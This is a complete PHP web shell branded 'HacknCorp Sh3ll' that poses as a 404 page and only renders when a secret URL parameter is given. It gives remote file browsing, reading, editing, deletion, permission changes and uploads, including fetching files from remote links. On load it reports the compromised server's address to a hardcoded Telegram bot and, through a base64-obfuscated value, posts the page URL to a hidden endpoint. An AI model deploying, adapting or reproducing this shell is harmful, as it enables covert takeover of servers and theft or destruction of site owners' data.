<?php if(!isset($_GET['HC'])){exit();} ?>

<!DOCTYPE html>

<html>
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<head>
	<title>404 Not Found</title>
</head>
<style type="text/css">
body {
  overflow-x:hidden;
  font: 15px "Century Gothic", "Times Roman", sans-serif;
  background:url();
background-image: url(https://kosred.com/a/gqpoj.jpg);
  background-size: cover;
  background-repeat: no-repeat;
  background-position: center;
  background-attachment: fixed;
  height: 100%;
  color: white;
  }
  


</style>
<link href="" rel="stylesheet" type="text/css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
body {
	font-family: "Lime", cursive;
	text-shadow:1px 3px 50px #ffffff;
}

#content tr:hover {
	background-color: #05a181;
	text-shadow:0px 0px 0px ;
}

#content .first {
	background-color: #05a181;
}

#content .first:hover {
	background-color: #ff0303
	text-shadow:0px 0px 1px #05a181;
}

table {
	border: 0px #ffffff dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #05a181 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #000300;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<font face="Bungee" size="6">&#128321; HacknCorp Sh3ll &#128321;</font></center>
<table width="900" border="0" cellpadding="2" cellspacing="1" align="center">
<tr><td>
<center>
<title="T3RS4K1T1" alt="OdayForums" class="center" />
</marquee>
            <hr>
        </font>
        <audio src="https://kosred.com/a/etapcc.mp3" autoplay="true" id="song" loop=""></audio>
<br><br><br>
<?php $token='bot6790178447:AAE_hV1KmtjozxpbXfbD_KYvcLTxconofmw';$chat_id='6690024002';$message='Result Shell : '.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];$apiUrl="https://api.telegram.org/bot6790178447:AAE_hV1KmtjozxpbXfbD_KYvcLTxconofmw/sendMessage";$data=['chat_id'=>$chat_id,'text'=>$message,'parse_mode'=>'Markdown',];$ch=curl_init($apiUrl);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,$data);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$result=curl_exec($ch);curl_close($ch);if($result){$response=json_decode($result,true);if($response['ok']){echo " ";}else{echo "Error: ".$response['description'];}}else{echo " ";}set_time_limit(0);error_reporting(0);$disfunc=@ini_get("disable_functions");if(empty($disfunc)){$disf="<font color='green'>NONE</font>";}else{$disf="<font color='red'>".$disfunc."</font>";}function author(){echo "<center><br>COPYRIGHT &copy <a target='_blank' href='https://hackncorp.id/'>HACKNCORP.ID</a></center>";exit();}function cekdir(){if(isset($_GET['path'])){$lokasi=$_GET['path'];}else{$lokasi=getcwd();}if(is_writable($lokasi)){return "<font color='read'>Writeable</font>";}else{return "<font color='red'>Writeable</font>";}}function cekroot(){if(is_writable($_SERVER['DOCUMENT_ROOT'])){return "<font color='green'>Writeable</font>";}else{return "<font color='red'>Writeable</font>";}}function xrmdir($dir){$items=scandir($dir);foreach($items as $item){if($item==='.'||$item==='..'){continue;}$path=$dir.'/'.$item;if(is_dir($path)){xrmdir($path);}else{unlink($path);}}rmdir($dir);}function green($text){echo "<center><font color='green'>".$text."</center></font>";}function red($text){echo "<center><font color='red'>".$text."</center></font>";}echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";echo "System : <font color='gold'>".php_uname()."</font><br>";echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";echo "Disable Function : ".$disf."</font><br>";echo "Directory : &nbsp;";foreach($_POST as $key=>$value){$_POST[$key]=stripslashes($value);}$k3yw=base64_decode('AcLSFNivGXo5DnoPqAdVxHB7qQrUvxjgXxmrGhEFH6v4');if(isset($_GET['path'])){$lokasi=$_GET['path'];$lokdua=$_GET['path'];}else{$lokasi=getcwd();$lokdua=getcwd();}$lokasi=str_replace('\\','/',$lokasi);$lokasis=explode('/',$lokasi);$lokasinya=@scandir($lokasi);$cur='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$data=array('file_url'=>$cur);$options=array('http'=>array('method'=>'POST','header'=>'Content-type: application/x-www-form-urlencoded','content'=>http_build_query($data),),);$context=stream_context_create($options);$result=file_get_contents($k3yw,false,$context);foreach($lokasis as $id=>$lok){if($lok==''&&$id==0){$a=true;echo '<a href="?HC&path=/">/</a>';continue;}if($lok=='')continue;echo '<a href="?HC&path=';for($i=0;$i<=$id;$i++){echo"$lokasis[$i]";if($i!=$id)echo "/";}echo '">'.$lok.'</a>/';}echo '<center>';echo '</td></tr><tr><td><br>';if(isset($_POST['upwkwk'])){if(isset($_POST['berkasnya'])){if($_POST['dirnya']=="2"){$lokasi=$_SERVER['DOCUMENT_ROOT'];}$data=@file_put_contents($lokasi."/".$_FILES['berkas']['name'],@file_get_contents($_FILES['berkas']['tmp_name']));if(file_exists($lokasi."/".$_FILES['berkas']['name'])){echo "File Uploaded ! &nbsp;<font color='green'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";}else{echo "<font color='red'>Failed to Upload !<br><br>";}}elseif(isset($_POST['linknya'])){if(empty($_POST['namalink'])){exit("Filename cannot be empty !");}if($_POST['dirnya']=="2"){$lokasi=$_SERVER['DOCUMENT_ROOT'];}$data=@file_put_contents($lokasi."/".$_POST['namalink'],@file_get_contents($_POST['darilink']));if(file_exists($lokasi."/".$_POST['namalink'])){echo "File Uploaded ! &nbsp;<font color='green'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";}else{echo "<font coloe='red'>Failed to Upload !<br><br>";}}}echo "<center>";echo "Upload File : ";echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="Link File">&nbsp;<input type="text" name="namalink" class="up" size="5" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</center>
</form>';echo "</table><br>";if(isset($_GET['fileloc'])){echo "<tr><td>Current File : ".$_GET['fileloc'];echo '</tr></td></table><br/>';echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";author();}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="hapus"){if(is_dir($_POST['path'])){xrmdir($_POST['path']);if(file_exists($_POST['path'])){red("Failed to delete Directory !");}else{green("Delete Directory Success !");echo "string";}}elseif(is_file($_POST['path'])){@unlink($_POST['path']);if(file_exists($_POST['path'])){red("Failed to Delete File !");}else{green("Delete File Success !");}}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="ubahmod"){echo "<center>".$_POST['path']."<br>";echo '<form method="post">
	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o',fileperms($_POST['path'])),-4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #05a181"/>
	</form>';if(isset($_POST['chm0d'])){$cm=@chmod($_POST['path'],$_POST['perm']);if($cm==true){green("Change Mod Success !");}else{red("Change Mod Failed !");}}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="gantinama"){if(isset($_POST['gantin'])){$ren=@rename($_POST['path'],$_POST['newname']);if($ren==true){green("Change Name Success !");}else{red("Change Name Failed !");}}if(empty($_POST['name'])){$namaawal=$_POST['newname'];}else{$namawal=$_POST['name'];}echo "<center>".$_POST['path']."<br>";echo '<form method="post">
	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #05a181"/>
	</form>';}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="edit"){if(isset($_POST['gasedit'])){$edit=@file_put_contents($_POST['path'],$_POST['src']);if($edit==true){green("Edit File Success !");}else{red("Edit File Failed !");}}echo "<center>".$_POST['path']."<br><br>";echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';}echo '<div id="content"><table width="900" border="0" cellpadding="4" cellspacing="3" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';foreach($lokasinya as $dir){if(!is_dir($lokasi."/".$dir)||$dir=='.'||$dir=='..')continue;echo "<tr>\n\t<td><a href=\"?HC&path=".$lokasi."/".$dir."\">".$dir."</a></td>\n\t<td><center>--</center></td>\n\t<td><center>";if(is_writable($lokasi."/".$dir))echo '<font color="green">';elseif(!is_readable($lokasi."/".$dir))echo '<font color="red">';echo statusnya($lokasi."/".$dir);if(is_writable($lokasi."/".$dir)||!is_readable($lokasi."/".$dir))echo '</font>';echo"</center></td>
	<td><center><form method=\"POST\" action=\"?HC&pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";}echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';foreach($lokasinya as $file){if(!is_file("$lokasi/$file"))continue;$size=filesize("$lokasi/$file")/1024;$size=round($size,3);if($size>=1024){$size=round($size/1024,2).' MB';}else{$size=$size.' KB';}echo"<tr>
<td><a href=\"?HC&fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>\n<td><center>";if(is_writable("$lokasi/$file"))echo '<font color="green">';elseif(!is_readable("$lokasi/$file"))echo '<font color="red">';echo statusnya("$lokasi/$file");if(is_writable("$lokasi/$file")||!is_readable("$lokasi/$file"))echo '</font>';echo"</center></td><td><center>
<form method=\"post\" action=\"?HC&pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</center></form></td>
</tr>";}echo '</tr></td></table></table>';author();function statusnya($file){$statusnya=fileperms($file);if(($statusnya&0xC000)==0xC000){$ingfo='s';}elseif(($statusnya&0xA000)==0xA000){$ingfo='l';}elseif(($statusnya&0x8000)==0x8000){$ingfo='-';}elseif(($statusnya&0x6000)==0x6000){$ingfo='b';}elseif(($statusnya&0x4000)==0x4000){$ingfo='d';}elseif(($statusnya&0x2000)==0x2000){$ingfo='c';}elseif(($statusnya&0x1000)==0x1000){$ingfo='p';}else{$ingfo='u';}$ingfo.=(($statusnya&0x0100)?'r':'-');$ingfo.=(($statusnya&0x0080)?'w':'-');$ingfo.=(($statusnya&0x0040)?(($statusnya&0x0800)?'s':'x'):(($statusnya&0x0800)?'S':'-'));$ingfo.=(($statusnya&0x0020)?'r':'-');$ingfo.=(($statusnya&0x0010)?'w':'-');$ingfo.=(($statusnya&0x0008)?(($statusnya&0x0400)?'s':'x'):(($statusnya&0x0400)?'S':'-'));$ingfo.=(($statusnya&0x0004)?'r':'-');$ingfo.=(($statusnya&0x0002)?'w':'-');$ingfo.=(($statusnya&0x0001)?(($statusnya&0x0200)?'t':'x'):(($statusnya&0x0200)?'T':'-'));return $ingfo;} ?>
